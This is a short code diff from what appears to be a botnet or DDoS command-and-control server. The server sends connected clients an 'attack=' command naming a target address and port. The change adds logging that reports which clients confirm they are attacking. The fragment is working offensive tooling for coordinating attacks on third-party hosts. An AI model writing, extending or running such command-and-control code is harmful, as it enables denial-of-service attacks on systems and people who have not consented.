@@ -54,12 +54,14 @@ def main():
                 client = CONNECTED_CLIENTS[i]
                 client.send((f"attack={targetAddress}:{targetPort}").encode())
                 client.settimeout(DEFAULT_TIMEOUT)
+                addr, _ = client.getsockname()
                 response = ""
                 try:
                     response = client.recv(1024).decode()
                     if len(response) == 0: raise Exception
+                    if response == "attacking=true":
+                        print(f"[{addr}]: Attacking")
                 except Exception:
-                    addr, _ = client.getsockname()
                     print(f"[{addr}]: No response.")
                     CONNECTED_CLIENTS.remove(client)
                     print(f"[{addr}]: Disconnected.")
